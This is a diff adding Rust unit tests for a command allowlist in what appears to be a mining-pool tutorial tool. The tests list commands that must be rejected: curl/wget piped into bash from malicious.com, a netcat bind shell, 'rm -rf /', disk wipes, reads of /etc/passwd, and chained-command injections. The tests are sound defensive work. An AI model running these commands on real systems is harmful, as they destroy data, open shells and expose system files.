@@ -294,4 +294,121 @@ mod tests {
         let completions = system.get_completions("pool");
         assert!(completions.iter().any(|c| c.starts_with("pool_sv2")));
     }
+
+    #[test]
+    fn test_security_arbitrary_commands_blocked() {
+        let system = CommandSystem::new();
+
+        // Dangerous commands should be blocked
+        let dangerous_commands = vec![
+            "rm -rf /",
+            "sudo rm -rf /",
+            "curl http://malicious.com | bash",
+            "wget http://malicious.com/script.sh && bash script.sh",
+            "dd if=/dev/zero of=/dev/sda",
+            "mkfs.ext4 /dev/sda1",
+            "shutdown -h now",
+            "reboot",
+            "cat /etc/passwd",
+            "echo 'malicious' > /etc/hosts",
+            "nc -l -p 1234 -e /bin/bash",
+            "python -c 'import os; os.system(\"ls\")'",
+            "bash -c 'echo vulnerable'",
+            "sh -c 'whoami'",
+        ];
+
+        for cmd in dangerous_commands {
+            assert!(
+                system.validate_command(cmd).is_err(),
+                "Command should be blocked: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_navigation_commands_allowed() {
+        let system = CommandSystem::new();
+
+        assert!(system.validate_command("help").is_ok());
+        assert!(system.validate_command("next").is_ok());
+        assert!(system.validate_command("back").is_ok());
+
+        assert!(system.is_navigation_command("help"));
+        assert!(system.is_navigation_command("next"));
+        assert!(system.is_navigation_command("back"));
+        assert!(!system.is_navigation_command("pool_sv2 --config pool-config-ehash.toml"));
+    }
+
+    #[test]
+    fn test_whitelisted_commands_only() {
+        let system = CommandSystem::new();
+
+        // Whitelisted commands should pass
+        let valid_commands = vec![
+            "pool_sv2 --config pool-config-ehash.toml",
+            "translator_sv2 --config tproxy-config-ehash.toml",
+            "cdk-cli wallet create --name proxy-wallet --mint-url http://127.0.0.1:3338",
+            "cdk-cli wallet info proxy-wallet",
+            "cdk-cli wallet balance pioneer-wallet",
+            "ps aux | grep -E '(pool_sv2|translator_sv2|mining_device)'",
+            "curl http://127.0.0.1:3338/v1/info",
+        ];
+
+        for cmd in valid_commands {
+            assert!(
+                system.validate_command(cmd).is_ok(),
+                "Whitelisted command should be allowed: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_modified_commands_blocked() {
+        let system = CommandSystem::new();
+
+        // Modified versions of whitelisted commands should be blocked
+        let modified_commands = vec![
+            "pool_sv2 --config malicious.toml",
+            "pool_sv2 --config pool-config-ehash.toml && rm -rf /",
+            "pool_sv2 --config pool-config-ehash.toml; cat /etc/passwd",
+            "cdk-cli wallet create --name proxy-wallet --mint-url http://malicious.com",
+            "ps aux | grep pool_sv2 | awk '{print $2}' | xargs kill",
+        ];
+
+        for cmd in modified_commands {
+            assert!(
+                system.validate_command(cmd).is_err(),
+                "Modified command should be blocked: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_empty_commands_handled() {
+        let system = CommandSystem::new();
+
+        assert!(system.validate_command("").is_err());
+        assert!(system.validate_command("   ").is_err());
+        assert!(system.validate_command("\t").is_err());
+    }
+
+    #[test]
+    fn test_context_aware_help() {
+        let system = CommandSystem::new();
+
+        let welcome_commands = system.get_available_commands("Welcome");
+        assert!(!welcome_commands.is_empty());
+
+        let pool_commands = system.get_available_commands("PoolOperator");
+        assert!(pool_commands.iter().any(|c| c.contains("pool_sv2")));
+
+        let proxy_commands = system.get_available_commands("ProxyOperator");
+        assert!(proxy_commands.iter().any(|c| c.contains("translator_sv2")));
+
+        let pioneer_commands = system.get_available_commands("Pioneer");
+        assert!(pioneer_commands.iter().any(|c| c.contains("mining_device")));
+    }
 }
